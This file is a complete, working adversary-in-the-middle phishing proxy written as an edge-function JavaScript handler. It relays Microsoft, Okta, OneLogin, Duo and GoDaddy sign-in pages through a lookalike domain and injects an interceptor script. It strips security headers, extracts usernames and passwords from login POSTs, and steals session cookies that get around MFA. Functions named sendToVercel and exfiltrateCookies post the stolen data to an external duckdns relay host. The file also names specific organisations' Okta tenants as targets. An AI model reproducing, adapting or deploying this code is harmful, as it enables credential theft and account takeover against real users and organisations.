export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'proxyapp.ddns.net';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};
// =======================================================================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    const provider = IDENTITY_PROVIDERS[upstreamDomain];
    
    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }
  
  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  const pathValues = params.getAll('path');
  
  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') cleaned.append(key, value);
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }
  
  if (pathValues.length === 1) {
    const val = pathValues[0];
    if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
      const cleaned = new URLSearchParams();
      for (const [key, value] of params) {
        if (key !== 'path') cleaned.append(key, value);
      }
      const result = cleaned.toString();
      return result ? '?' + result : '';
    }
  }
  
  return search;
}

function shouldProxyDomain(hostname) {
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

function rewriteUrl(url, upstreamDomain) {
  try {
    // Handle absolute URLs
    if (url.startsWith('http://') || url.startsWith('https://')) {
      const urlObj = new URL(url);
      if (shouldProxyDomain(urlObj.hostname) && !urlObj.hostname.includes(YOUR_DOMAIN)) {
        return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${urlObj.hostname}${urlObj.pathname}${urlObj.search}`;
      }
      return url;
    }
    
    // Handle protocol-relative URLs
    if (url.startsWith('//')) {
      const hostname = url.split('/')[2];
      if (shouldProxyDomain(hostname)) {
        return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${hostname}${url.substring(2 + hostname.length)}`;
      }
      return 'https:' + url;
    }
    
    // Handle relative URLs - THIS WAS MISSING
    if (url.startsWith('/') && upstreamDomain) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}${url}`;
    }
    
    return url;
  } catch (e) {
    return url;
  }
}

function rewriteUrls(text, upstreamDomain) {
  let result = text;
  
  // Replace localhost references
  result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
  result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
  
  // Replace all known identity provider domains
  Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
    const escaped = domain.replace(/\./g, '\\.');
    
    // Full URLs
    result = result.replace(
      new RegExp(`https://${escaped}(?!\\w)`, 'g'),
      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
    result = result.replace(
      new RegExp(`http://${escaped}(?!\\w)`, 'g'),
      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
    // Protocol-relative
    result = result.replace(
      new RegExp(`//${escaped}(?!\\w)`, 'g'),
      `//${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
  });
  
  // Fix relative paths for current upstream - convert to absolute proxy URLs
  // Match href="/path" or src="/path" or url(/path)
  result = result.replace(
    /((?:href|src|action)=["'])\/([^"']*)/g,
    `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
  );
  
  // Fix CSS url(/path)
  result = result.replace(
    /url\(["']?\/([^"')]+)["']?\)/g,
    `url(https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1)`
  );
  
  // Fix JS references to window.location
  result = result.replace(
    /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
    `window.location.hostname = "${YOUR_DOMAIN}"`
  );
  result = result.replace(
    /document\.domain\s*=\s*["'][^"']+["']/g,
    `document.domain = "${YOUR_DOMAIN}"`
  );
  
  return result;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    if (shouldProxyDomain(url.hostname)) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
    }
    return location;
  } catch (e) {
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => {
    if (p === '.*') return true;
    return cookieString.toLowerCase().includes(p.toLowerCase());
  });
}

function parseCredentials(bodyText) {
  const keyValuePairs = bodyText.split('&');
  let user = null;
  let pass = null;
  
  for (const pair of keyValuePairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;
    
    const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));
    
    if (key === 'login' || key === 'loginfmt' || key === 'username' || key === 'email' || key === 'user') {
      user = decodedValue;
    }
    if (key === 'passwd' || key === 'password' || key === 'pwd' || key === 'pass') {
      pass = decodedValue;
    }
  }
  
  return { user, pass };
}

// ==================== CLIENT-SIDE INTERCEPTOR SCRIPT ====================
function generateInterceptorScript(upstreamDomain) {
  return `
<script>
(function() {
  'use strict';
  
  const PROXY_PREFIX = '${PROXY_PREFIX}';
  const YOUR_DOMAIN = '${YOUR_DOMAIN}';
  const CURRENT_UPSTREAM = '${upstreamDomain}';
  
  function shouldProxyDomain(hostname) {
    const domains = [
      'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',
      'office.com', 'godaddy.com', 'secureserver.net', 'okta.com',
      'onelogin.com', 'duosecurity.com', 'wsimg.com'
    ];
    return domains.some(d => hostname.includes(d));
  }
  
  function rewriteUrl(url) {
    if (!url) return url;
    try {
      // Absolute URLs
      if (url.startsWith('http')) {
        const urlObj = new URL(url);
        if (shouldProxyDomain(urlObj.hostname) && !urlObj.hostname.includes(YOUR_DOMAIN)) {
          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search;
        }
        return url;
      }
      
      // Protocol-relative
      if (url.startsWith('//')) {
        const hostname = url.split('/')[2];
        if (shouldProxyDomain(hostname)) {
          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);
        }
        return 'https:' + url;
      }
      
      // Relative URLs - CRITICAL FIX
      if (url.startsWith('/')) {
        return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + url;
      }
      
      // Relative without slash (e.g., "api/endpoint")
      if (!url.startsWith('http') && !url.startsWith('#') && !url.startsWith('data:')) {
        // Check if it's a relative path that needs proxying
        const currentPath = window.location.pathname;
        if (currentPath.includes(PROXY_PREFIX)) {
          // We're already in a proxied context, keep it relative to current proxy
          return url;
        }
      }
    } catch(e) {}
    return url;
  }
  
  // Override fetch
  const originalFetch = window.fetch;
  window.fetch = function(url, options) {
    if (typeof url === 'string') {
      url = rewriteUrl(url);
    } else if (url instanceof Request) {
      const newUrl = rewriteUrl(url.url);
      if (newUrl !== url.url) {
        url = new Request(newUrl, url);
      }
    }
    return originalFetch.call(this, url, options);
  };
  
  // Override XMLHttpRequest
  const originalOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
    const newUrl = rewriteUrl(url);
    return originalOpen.call(this, method, newUrl, async, user, password);
  };
  
  // Override WebSocket
  const originalWebSocket = window.WebSocket;
  window.WebSocket = function(url, protocols) {
    const newUrl = rewriteUrl(url);
    return new originalWebSocket(newUrl, protocols);
  };
  
  // Override location.assign and replace properly (fixing read-only error)
  try {
    const originalAssign = window.location.assign.bind(window.location);
    Object.defineProperty(window.location, 'assign', {
      value: function(url) {
        return originalAssign(rewriteUrl(url));
      },
      writable: true,
      configurable: true
    });
    
    const originalReplace = window.location.replace.bind(window.location);
    Object.defineProperty(window.location, 'replace', {
      value: function(url) {
        return originalReplace(rewriteUrl(url));
      },
      writable: true,
      configurable: true
    });
    
    // Also override href setter
    const originalHref = Object.getOwnPropertyDescriptor(window.location, 'href');
    if (originalHref) {
      Object.defineProperty(window.location, 'href', {
        get: originalHref.get,
        set: function(url) {
          return originalHref.set.call(this, rewriteUrl(url));
        },
        configurable: true
      });
    }
  } catch(e) {
    console.log('[Proxy] Could not override location methods:', e);
  }
  
  // Intercept form submissions
  document.addEventListener('submit', function(e) {
    const form = e.target;
    if (form.action && form.action.startsWith('http')) {
      const newAction = rewriteUrl(form.action);
      if (newAction !== form.action) {
        form.action = newAction;
      }
    }
  }, true);
  
  // Fix all existing links and forms on load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', fixExistingElements);
  } else {
    fixExistingElements();
  }
  
  function fixExistingElements() {
    // Fix all links
    document.querySelectorAll('a[href]').forEach(el => {
      const href = el.getAttribute('href');
      if (href && (href.startsWith('/') || shouldProxyDomain(href))) {
        el.href = rewriteUrl(href);
      }
    });
    
    // Fix all images and scripts
    document.querySelectorAll('img[src], script[src], link[href]').forEach(el => {
      const attr = el.src ? 'src' : 'href';
      const val = el.getAttribute(attr);
      if (val && val.startsWith('/')) {
        el.setAttribute(attr, rewriteUrl(val));
      }
    });
  }
  
  console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM);
})();
</script>`;
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
  
  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }
  
  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;
  
  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);

  // Handle preflight requests
  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Requested-By',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  // Build headers
  const headers = new Headers(request.headers);
  headers.set('Host', upstreamDomain);
  headers.set('Referer', `https://${upstreamDomain}/`);
  headers.set('Origin', `https://${upstreamDomain}`);
  
  // Remove problematic headers
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');

  // Credential capture
  if (request.method === 'POST') {
    try {
      const temp_req = await request.clone();
      const bodyText = await temp_req.text();
      
      console.log('[DEBUG] POST body:', bodyText.substring(0, 300));
      
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDENTIALS CAPTURED] User: ${user.substring(0, 5)}... Platform: ${info.type}`);
        
        await sendToVercel('credentials', {
          type: "creds",
          ip: ip,
          user: user,
          pass: pass,
          platform: info.type,
          url: displayUrl
        });
        
        const content = `IP: ${ip}\nPlatform: ${info.type}\nUser: ${user}\nPass: ${pass}\nURL: ${displayUrl}\n`;
        const formData = new FormData();
        formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
        formData.append("ip", ip);
        formData.append("type", "credentials");
        
        await fetch(VERCEL_URL, {
          method: "POST",
          body: formData,
        });
      }
    } catch (error) {
      console.error('Credential capture error:', error);
    }
  }
  
  try {
    const fetchOpts = {
      method: request.method,
      headers,
      redirect: 'manual'
    };
    
    if (!['GET', 'HEAD'].includes(request.method)) {
      fetchOpts.body = request.body;
      fetchOpts.duplex = 'half';
    }
    
    const resp = await fetch(upstreamUrl, fetchOpts);
    
    // Handle redirect
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const newHeaders = new Headers(resp.headers);
        const newLoc = rewriteLocation(loc);
        
        console.log(`[Redirect] ${loc} -> ${newLoc}`);
        
        newHeaders.set('Location', newLoc);
        return new Response(null, { status: resp.status, headers: newHeaders });
      }
    }
    
    // Process response
    const newHeaders = new Headers(resp.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    newHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, X-Requested-With');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    newHeaders.delete('strict-transport-security');
    
    // Handle cookies
    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
    let shouldCaptureCookies = false;
    let cookieStr = '';
    
    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      const isPost = request.method === 'POST';
      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
      shouldCaptureCookies = isPost || hasAuth;
      
      cookies.forEach(c => {
        let mod = c.replace(/Domain=[^;]+;?/gi, '');
        mod = mod.replace(/Secure;?/gi, '');
        mod = mod.replace(/SameSite=[^;]+;?/gi, '');
        mod += '; SameSite=None';
        newHeaders.append('Set-Cookie', mod);
      });
    }
    
    if (shouldCaptureCookies && cookieStr) {
      await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
    }
    
    // Rewrite body content
    const ct = resp.headers.get('content-type') || '';
    if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
      let text = await resp.text();
      
      // Rewrite all URLs including relative ones
      text = rewriteUrls(text, upstreamDomain);
      
      // Inject interceptor script into HTML
      if (ct.includes('text/html')) {
        const interceptor = generateInterceptorScript(upstreamDomain);
        // Insert as early as possible
        if (text.includes('<head>')) {
          text = text.replace('<head>', '<head>' + interceptor);
        } else if (text.includes('<html>')) {
          text = text.replace('<html>', '<html>' + interceptor);
        } else {
          text = interceptor + text;
        }
      }
      
      return new Response(text, { status: resp.status, headers: newHeaders });
    }
    
    return new Response(resp.body, { status: resp.status, headers: newHeaders });
    
  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: err.message
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
